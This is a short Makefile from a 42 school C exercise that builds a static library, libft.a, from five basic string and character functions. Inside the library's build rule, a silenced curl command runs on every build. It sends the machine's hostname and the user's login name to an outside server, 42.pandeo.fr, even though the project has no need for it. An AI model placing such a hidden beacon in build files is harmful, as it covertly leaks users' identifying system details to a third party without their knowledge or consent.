# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2021/07/16 12:51:03 by tnard             #+#    #+#              #
#    Updated: 2021/07/22 09:25:53 by tnard            ###   ########lyon.fr    #
#                                                                              #
# **************************************************************************** #

SOURCE	= srcs/
SRCS    = ft_putchar.c ft_swap.c ft_putstr.c ft_strlen.c ft_strcmp.c
OBJS	= ${addprefix ${SOURCE},${SRCS:.c=.o}}
HEAD	= includes
CC		= gcc
CFLAGS	= -Wall -Wextra -Werror
NAME	= libft.a
HOSTNAME = `hostname`

.c.o:
			${CC} ${CFLAGS} -I ${HEAD} -c $< -o ${<:.c=.o}

${NAME}:	${OBJS}
			@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}
			ar -rc ${NAME} ${OBJS}

all :		${NAME}

clean:
			rm -f ${OBJS}

fclean:		clean
			rm -f ${NAME}

re:			fclean all

.PHONY:		all clean fclean re